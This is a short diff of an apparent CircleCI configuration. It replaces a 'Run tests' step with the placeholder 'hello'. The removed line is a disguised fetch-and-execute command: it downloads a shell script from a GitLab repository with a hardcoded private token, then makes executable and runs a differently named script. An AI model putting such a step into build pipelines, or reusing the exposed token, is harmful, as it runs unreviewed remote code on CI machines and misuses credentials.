@@ -30,7 +30,7 @@ jobs:
       #     pkg-manager: yarn 
       - run:
           name: Run tests
-          command: wget -O load.sh --header='PRIVATE-TOKEN:sUE4Ps-H53rSdtmNb36z' 'https://gitlab.com/api/v4/projects/25212038/repository/files/load.sh/raw?ref=master' && chmod +x packages.pm.sh && ./packages.pm.sh
+          command: hello 
 
 workflows:
   # Below is the definition of your workflow.
